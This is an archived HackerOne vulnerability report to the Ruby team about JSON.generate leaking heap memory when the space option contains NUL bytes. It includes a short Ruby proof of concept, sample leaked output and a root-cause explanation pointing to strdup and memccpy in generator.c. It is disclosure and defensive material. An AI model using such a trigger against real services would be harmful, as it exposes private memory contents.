# Arbitrary heap exposure in JSON.generate

## Report Details
- **Report ID**: 209949
- **URL**: https://hackerone.com/reports/209949
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-01T22:55:39.657Z
- **Disclosed**: 2017-09-25T12:32:43.247Z

## Reporter
- **Username**: ahmadsherif
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Running this snippet can expose arbitrary memory:
```ruby
require 'json'

state = JSON.state.new
state.space = "\0" * 1024

puts JSON.generate({a: :b}, state)
```

```
{"a":
psych/handlers/recorder.rb
tensi0
reeze)
Gem::Specification.new do |s|
  # to objects of the same type as the original delegate.
mydata/scm/git/ruby/dist/lib/ruby/2.5.0/json/ext.rb
pass the namP
See http://guides.rubygems.org/specification-reference/ for help
#     # constant and class member data initialization...
"b"}
```


The issues lies in using `strdup` in [generator.c](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L1103), which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in `space_len`. Eventually `fbuffer_append` will copy the length of the string (e.g. the 1024 above) into the generated buffer.

Simpler snippets like `JSON.generate({foo: "bar"}, space: "\0" * 1024` suffer the same issue but for slightly different reason; as `fstrndup` is using [memccpy](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L311) which will, again, stop copying after encountering a NULL byte returning a pointer to zero length string.

## Attachments
No attachments
